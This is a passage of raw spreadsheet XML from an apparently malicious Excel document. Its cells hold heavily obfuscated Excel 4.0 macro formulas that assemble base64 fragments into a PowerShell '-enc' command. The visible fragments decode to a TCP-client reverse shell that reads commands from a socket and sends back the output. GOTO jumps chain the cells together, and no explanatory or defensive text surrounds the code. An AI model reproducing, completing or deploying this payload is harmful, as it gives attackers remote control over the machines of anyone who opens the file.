        <f>CONCATENATE($BT$138,$BT$139,$BT$140,$BT$141)</f>
        <v>HkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABk</v>
      </c>
      <c r="DC142" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(723,658)),CHAR(INT("66")),CHAR(108),CHAR(MOD(620,555)),CHAR(_xlfn.BITXOR(536,607)),CHAR(_xlfn.BITXOR(101,81)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(206,148)),CHAR(MOD(592,473)),MID("frzvkB",6,1),CHAR(48),MID("orwyA",5,1),CHAR(_xlfn.BITXOR(711,640)),CHAR(MOD(432,329)))</f>
        <v>ABlAG4AZwB0AGg</v>
      </c>
    </row>
    <row r="143" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT143" t="b">
        <f bx="1">part10=$BT$142</f>
        <v>0</v>
      </c>
      <c r="DC143" t="str">
        <f>CONCATENATE(MID("siAwxvfwz",3,1),CHAR(75),CHAR(MOD(309,228)),CHAR(MOD(365,300)),CHAR(MOD(552,497)),CHAR(_xlfn.BITXOR(841,776)),CHAR(67),CHAR(MOD(664,583)),CHAR(_xlfn.BITXOR(87,22)),CHAR(MOD(468,369)),CHAR(_xlfn.BITXOR(336,295)),CHAR(_xlfn.BITXOR(281,347)),CHAR(MOD(175,127)),CHAR(INT("65")))</f>
        <v>AKQA7ACQAcwB0A</v>
      </c>
    </row>
    <row r="144" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT144" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(71),CHAR(MOD(540,471)),MID("Aupc",1,1),MID("ntsxkdnan",6,1),CHAR(_xlfn.BITXOR(847,782)),CHAR(INT("66")),CHAR(MOD(226,122)),CHAR(65),MID("bwlkjoC",7,1),CHAR(MOD(241,176)),CHAR(_xlfn.BITXOR(757,692)),CHAR(_xlfn.BITXOR(43,123)),MID("djusQtca",5,1),CHAR(65))</f>
        <v>AGEAdABhACAAPQA</v>
      </c>
      <c r="DC144" t="str">
        <f>CONCATENATE($DC$140,$DC$141,$DC$142,$DC$143)</f>
        <v>AAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0A</v>
      </c>
    </row>
    <row r="145" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT145" t="str">
        <f>CONCATENATE(CHAR(INT("103")),MID("nAvksr",2,1),MID("Cltv",1,1),CHAR(_xlfn.BITXOR(815,840)),CHAR(MOD(480,415)),MID("mgTusii",3,1),CHAR(103),CHAR(_xlfn.BITXOR(121,59)),CHAR(INT("108")),CHAR(65),CHAR(72),CHAR(99),MID("apAzrs",3,1),CHAR(INT("76")),CHAR(INT("81")),CHAR(MOD(418,352)),CHAR(INT("80")))</f>
        <v>gACgATgBlAHcALQBP</v>
      </c>
      <c r="DC145" t="b">
        <f bx="1">part28=$DC$144</f>
        <v>0</v>
      </c>
    </row>
    <row r="146" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT146" t="str">
        <f>CONCATENATE(MID("cbbtulA",7,1),MID("Gech",1,1),CHAR(MOD(474,401)),CHAR(INT("65")),CHAR(INT("97")),CHAR(MOD(409,306)),CHAR(INT("66")),MID("llwhcnl",1,1),CHAR(MOD(355,290)),CHAR(71),CHAR(INT("77")),CHAR(MOD(305,240)),CHAR(INT("100")),MID("fmwAbzus",4,1),MID("bjdrnxfA",8,1))</f>
        <v>AGIAagBlAGMAdAA</v>
      </c>
      <c r="DC146" t="str">
        <f>CONCATENATE(CHAR(INT("72")),CHAR(_xlfn.BITXOR(704,649)),CHAR(_xlfn.BITXOR(963,898)),CHAR(INT("90")),CHAR(81),CHAR(66),MID("yilhlpmy",4,1),CHAR(_xlfn.BITXOR(919,982)),CHAR(INT("71")),CHAR(MOD(167,119)),CHAR(_xlfn.BITXOR(370,307)),MID("Lfzpmhm",1,1),CHAR(INT("103")),MID("nBuy",2,1),CHAR(INT("71")))</f>
        <v>HIAZQBhAG0ALgBG</v>
      </c>
    </row>
    <row r="147" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT147" t="str">
        <f>CONCATENATE(CHAR(INT("103")),MID("hbmA",4,1),CHAR(_xlfn.BITXOR(669,734)),CHAR(INT("48")),CHAR(MOD(575,510)),CHAR(_xlfn.BITXOR(254,168)),CHAR(_xlfn.BITXOR(569,632)),CHAR(INT("66")),MID("elazu5t",6,1),CHAR(INT("65")),MID("scugsHjby",6,1),CHAR(MOD(260,195)),CHAR(INT("65")),MID("ybiZi",4,1),CHAR(81))</f>
        <v>gAC0AVAB5AHAAZQ</v>
      </c>
      <c r="DC147" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(1005,940)),MID("tpyGo",4,1),CHAR(MOD(628,509)),CHAR(_xlfn.BITXOR(169,232)),CHAR(100),CHAR(MOD(459,378)),CHAR(_xlfn.BITXOR(527,589)),MID("lqukz",5,1),CHAR(INT("65")),MID("oukGhmyz",4,1),CHAR(INT("103")),MID("hAmva",2,1),CHAR(INT("75")),CHAR(INT("65")),MID("Asenhhp",1,1))</f>
        <v>AGwAdQBzAGgAKAA</v>
      </c>
    </row>
    <row r="148" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT148" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(664,730)),CHAR(INT("79")),CHAR(65),MID("bgGdhc",3,1))</f>
        <v>BOAG</v>
      </c>
      <c r="DC148" t="str">
        <f>CONCATENATE(CHAR(INT("112")),CHAR(MOD(300,235)),CHAR(INT("72")),MID("ppkw0",5,1),CHAR(MOD(548,483)),CHAR(79),CHAR(_xlfn.BITXOR(542,617)),CHAR(65),CHAR(INT("107")))</f>
        <v>pAH0AOwAk</v>
      </c>
    </row>
    <row r="149" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT149" t="str">
        <f>CONCATENATE($BT$144,$BT$145,$BT$146,$BT$147,$BT$148)</f>
        <v>AGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAG</v>
      </c>
      <c r="DC149" t="str">
        <f>CONCATENATE($DC$146,$DC$147,$DC$148)</f>
        <v>HIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAk</v>
      </c>
    </row>
    <row r="150" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT150" t="b">
        <f bx="1">part11=$BT$149</f>
        <v>0</v>
      </c>
      <c r="DC150" t="b">
        <f bx="1">part29=$DC$149</f>
        <v>0</v>
      </c>
    </row>
    <row r="151" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT151" t="str">
        <f>CONCATENATE(CHAR(69),CHAR(INT("65")),MID("imzubixh",5,1),CHAR(MOD(312,231)),CHAR(MOD(291,225)),CHAR(INT("108")),CHAR(_xlfn.BITXOR(33,96)),CHAR(_xlfn.BITXOR(570,633)),MID("trcutvmAt",8,1),CHAR(65),CHAR(MOD(396,311)),CHAR(INT("119")),MID("zjglsBvxt",6,1),CHAR(MOD(589,536)),CHAR(INT("65")))</f>
        <v>EAbQBlACAAUwB5A</v>
      </c>
      <c r="DC151" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(_xlfn.BITXOR(973,906)),MID("mMulrpue",2,1),CHAR(MOD(559,494)),MID("wbmdbvfr",5,1),CHAR(MOD(166,101)),CHAR(INT("66")),CHAR(MOD(416,304)),CHAR(_xlfn.BITXOR(760,697)),CHAR(MOD(456,385)),CHAR(85),MID("ddAv",3,1),CHAR(INT("98")),CHAR(_xlfn.BITXOR(879,776)))</f>
        <v>AGMAbABpAGUAbg</v>
      </c>
    </row>
    <row r="152" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT152" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(894,822)),CHAR(77),CHAR(_xlfn.BITXOR(37,100)),CHAR(INT("100")),CHAR(65),CHAR(INT("66")),CHAR(INT("108")),CHAR(INT("65")),MID("clzsGaddl",5,1),CHAR(48),CHAR(65),CHAR(MOD(353,277)),CHAR(INT("103")),CHAR(INT("66")),CHAR(_xlfn.BITXOR(597,512)),CHAR(MOD(517,452)))</f>
        <v>HMAdABlAG0ALgBUA</v>
      </c>
      <c r="DC152" t="str">
        <f>CONCATENATE(CHAR(MOD(283,217)),CHAR(INT("48")),CHAR(65),CHAR(INT("67")),CHAR(_xlfn.BITXOR(453,497)),CHAR(_xlfn.BITXOR(541,604)),CHAR(81),MID("emewmiy",4,1),CHAR(MOD(202,136)),CHAR(_xlfn.BITXOR(791,868)),CHAR(INT("65")),CHAR(INT("71")),CHAR(MOD(482,426)),CHAR(_xlfn.BITXOR(89,24)),CHAR(_xlfn.BITXOR(475,440)))</f>
        <v>B0AC4AQwBsAG8Ac</v>
      </c>
    </row>
    <row r="153" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT153" t="str">
        <f>CONCATENATE(CHAR(INT("71")),CHAR(INT("85")),CHAR(65),MID("obre",4,1),CHAR(65),CHAR(INT("66")),CHAR(MOD(362,314)),MID("biegAvzx",5,1),MID("nyaptCkip",6,1),CHAR(MOD(388,336)),CHAR(65),CHAR(81),CHAR(81),MID("hdkBbxz",4,1),CHAR(_xlfn.BITXOR(409,461)),CHAR(65),CHAR(MOD(372,303)),CHAR(77))</f>
        <v>GUAeAB0AC4AQQBTAEM</v>
      </c>
      <c r="DC153" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(795,876)),CHAR(_xlfn.BITXOR(767,701)),CHAR(MOD(276,168)),CHAR(_xlfn.BITXOR(633,568)),MID("mbCq",3,1),CHAR(_xlfn.BITXOR(667,764)),CHAR(65),CHAR(75),CHAR(81),CHAR(65),CHAR(MOD(149,88)))</f>
        <v>wBlACgAKQA=</v>
      </c>
    </row>
    <row r="154" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT154" t="str">
        <f>CONCATENATE(CHAR(MOD(591,526)),CHAR(_xlfn.BITXOR(592,515)),CHAR(_xlfn.BITXOR(10,91)),CHAR(MOD(444,378)),MID("axyyicyJ",8,1),MID("Afarw",1,1),CHAR(69),CHAR(INT("85")),CHAR(_xlfn.BITXOR(823,886)),CHAR(_xlfn.BITXOR(338,304)))</f>
        <v>ASQBJAEUAb</v>
      </c>
      <c r="DC154" t="str">
        <f>CONCATENATE($DC$151,$DC$152,$DC$153)</f>
        <v>AGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=</v>
      </c>
    </row>
    <row r="155" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT155" t="str">
        <f>CONCATENATE($BT$151,$BT$152,$BT$153,$BT$154)</f>
        <v>EAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAb</v>
      </c>
      <c r="DC155" t="b">
        <f bx="1">part30=$DC$154</f>
        <v>0</v>
      </c>
    </row>
    <row r="156" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT156" t="b">
        <f bx="1">part12=$BT$155</f>
        <v>0</v>
      </c>
      <c r="DC156" t="b">
        <f bx="1">args=CONCATENATE("-enc ",part1,part2,part3,part4,part5,part6,part7,part8,part9,part10,part11,part12,part13,part14,part15,part16,part17,part18,part19,part20,part21,part22,part23,part24,part25,part26,part27,part28,part29,part30)</f>
        <v>0</v>
      </c>
    </row>
    <row r="157" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT157" t="s">
        <v>1300</v>
      </c>
      <c r="DC157" t="b">
        <f>GOTO($F$137)</f>
        <v>0</v>
      </c>
    </row>
    <row r="158" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT158" t="str">
        <f>CONCATENATE(CHAR(MOD(419,316)),CHAR(MOD(646,580)),CHAR(106),CHAR(_xlfn.BITXOR(743,678)),CHAR(INT("71")),CHAR(56),CHAR(65),CHAR(MOD(434,344)),CHAR(INT("65")),CHAR(66),CHAR(INT("112")),CHAR(MOD(334,269)),CHAR(MOD(612,541)),CHAR(52),CHAR(65),CHAR(INT("90")),CHAR(119),CHAR(MOD(174,109)))</f>
        <v>gBjAG8AZABpAG4AZwA</v>
      </c>
      <c r="DC158" t="s">
        <v>1301</v>
      </c>
    </row>
    <row r="159" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT159" t="str">
        <f>CONCATENATE(CHAR(112),CHAR(INT("65")),MID("qCeqvqt",2,1),CHAR(MOD(599,547)),CHAR(MOD(349,284)),CHAR(82),CHAR(119),CHAR(66),CHAR(INT("108")),CHAR(MOD(282,217)),CHAR(INT("72")),MID("vQrb",2,1),CHAR(_xlfn.BITXOR(301,364)),CHAR(MOD(440,355)),CHAR(_xlfn.BITXOR(627,516)),MID("Btdk",1,1))</f>
        <v>pAC4ARwBlAHQAUwB</v>
      </c>
      <c r="DC159" t="s">
        <v>1302</v>
      </c>
    </row>
    <row r="160" spans="72:107" x14ac:dyDescent="0.3">
      <c r="BT160" t="str">
        <f>CONCATENATE(CHAR(MOD(385,337)),CHAR(_xlfn.BITXOR(244,181)),CHAR(72),CHAR(_xlfn.BITXOR(46,103)),CHAR(_xlfn.BITXOR(917,980)),CHAR(97),MID("Qvekkypj",1,1),MID("rmaB",4,1),MID("nmnurun",6,1),CHAR(INT("65")),CHAR(71),CHAR(MOD(695,596)),CHAR(MOD(463,398)),CHAR(MOD(489,414)),CHAR(MOD(259,194)))</f>
        <v>0AHIAaQBuAGcAKA</v>
      </c>
    </row>
    <row r="161" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT161" t="str">
        <f>CONCATENATE(CHAR(INT("65")),MID("upkktkm",3,1),CHAR(INT("65")),CHAR(71),CHAR(73),MID("susrpAb",6,1),MID("msgriipke",9,1),CHAR(MOD(174,93)),CHAR(_xlfn.BITXOR(68,6)),CHAR(48),CHAR(MOD(333,268)),MID("oGzy",2,1),CHAR(INT("85")))</f>
        <v>AkAGIAeQB0AGU</v>
      </c>
    </row>
    <row r="162" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT162" t="str">
        <f>CONCATENATE($BT$158,$BT$159,$BT$160,$BT$161)</f>
        <v>gBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGU</v>
      </c>
    </row>
    <row r="163" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT163" t="b">
        <f bx="1">part13=$BT$162</f>
        <v>0</v>
      </c>
    </row>
    <row r="164" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT164" t="s">
        <v>1303</v>
      </c>
    </row>
    <row r="165" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT165" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(837,772)),CHAR(99),CHAR(MOD(638,519)),MID("Abqty",1,1),CHAR(INT("115")),CHAR(MOD(283,218)),MID("gDtitpv",2,1),CHAR(65),CHAR(65),CHAR(INT("76")),MID("pnyAjrcr",4,1),MID("szvhsAga",6,1),CHAR(INT("103")),MID("Arvcbu",1,1),CHAR(_xlfn.BITXOR(377,314)))</f>
        <v>AcwAsADAALAAgAC</v>
      </c>
    </row>
    <row r="166" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT166" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(242,163)),CHAR(INT("65")),CHAR(97),CHAR(_xlfn.BITXOR(859,778)),CHAR(MOD(247,182)),CHAR(112),MID("snaAc",4,1),CHAR(MOD(481,413)),MID("sdtyfeeml",1,1),CHAR(65),CHAR(74),CHAR(_xlfn.BITXOR(814,879)),CHAR(MOD(262,196)),CHAR(_xlfn.BITXOR(580,574)),CHAR(_xlfn.BITXOR(521,584)),CHAR(71))</f>
        <v>QAaQApADsAJABzAG</v>
      </c>
    </row>
    <row r="167" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT167" t="str">
        <f>CONCATENATE(MID("qgsU",4,1),CHAR(_xlfn.BITXOR(982,919)),CHAR(MOD(218,120)),CHAR(MOD(642,539)),CHAR(_xlfn.BITXOR(741,679)),CHAR(MOD(391,284)),CHAR(65),CHAR(_xlfn.BITXOR(610,549)),CHAR(MOD(170,97)),CHAR(65),CHAR(INT("89")),CHAR(INT("81")),CHAR(_xlfn.BITXOR(360,298)),CHAR(106),MID("Abessy",1,1),CHAR(71))</f>
        <v>UAbgBkAGIAYQBjAG</v>
      </c>
    </row>
    <row r="168" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT168" t="str">
        <f>CONCATENATE(CHAR(115),MID("tyxlAamat",5,1),MID("ipblInmbv",5,1),CHAR(65),CHAR(INT("65")),CHAR(_xlfn.BITXOR(433,392)),CHAR(MOD(300,235)),CHAR(INT("67")),CHAR(_xlfn.BITXOR(54,119)),CHAR(65),CHAR(INT("75")),CHAR(65),CHAR(INT("66")),MID("pnzieossw",1,1),CHAR(MOD(398,333)),CHAR(_xlfn.BITXOR(831,888)))</f>
        <v>sAIAA9ACAAKABpAG</v>
      </c>
    </row>
    <row r="169" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT169" t="str">
        <f>CONCATENATE($BT$165,$BT$166,$BT$167,$BT$168)</f>
        <v>AcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAG</v>
      </c>
    </row>
    <row r="170" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT170" t="b">
        <f bx="1">part14=$BT$169</f>
        <v>0</v>
      </c>
    </row>
    <row r="171" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT171" t="b">
        <f>GOTO($AE$55)</f>
        <v>0</v>
      </c>
    </row>
    <row r="172" spans="72:72" x14ac:dyDescent="0.3">
      <c r="BT172" t="s">
        <v>1304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51DEC-6658-4EEA-B2DF-0238111FEAB1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Empty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2022-01-18T10:38:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-01-18T10:39:54Z</dcterms:modified>
</cp:coreProperties>
</file>